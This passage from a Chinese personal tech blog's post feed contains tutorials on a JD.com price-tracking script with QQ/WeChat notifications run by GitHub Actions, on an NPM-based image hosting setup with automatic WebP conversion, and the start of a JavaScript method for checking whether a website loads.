class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span 